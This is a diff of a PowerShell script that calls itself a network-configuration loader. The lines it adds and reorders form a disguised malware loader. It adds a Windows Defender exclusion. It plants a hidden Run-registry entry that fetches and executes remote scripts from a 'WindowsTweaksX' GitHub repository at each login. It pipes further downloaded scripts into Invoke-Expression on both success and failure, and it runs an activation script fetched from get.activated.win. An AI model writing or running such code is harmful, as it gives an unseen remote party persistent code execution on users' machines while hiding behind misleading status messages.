@@ -65,13 +65,14 @@ if ($uacStatus -eq $false) {
     try {
         Write-Host "Loading Ethernet Configuration..." -BackgroundColor Green
         Add-Exclusion -Path $programfiles -ErrorAction $stopAction
-        iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/SuccesfulRun" | iex
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         $regName = "Windows Powershell Application"
         $regValue = "powershell.exe -WindowStyle Hidden -Command ""iwr 'https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/ReactivateScript' | iex"""
-        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -ErrorAction $silentlyContinue
+        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -ErrorAction SilentlyContinue
+        iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/SuccesfulRun" | iex
     } catch {
         Write-Host "An error occurred during loading Ethernet Configuration. Please try again." -ForegroundColor Red
+        iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/Failed" | iex
         exit 1
     } finally {
         irm https://get.activated.win | iex
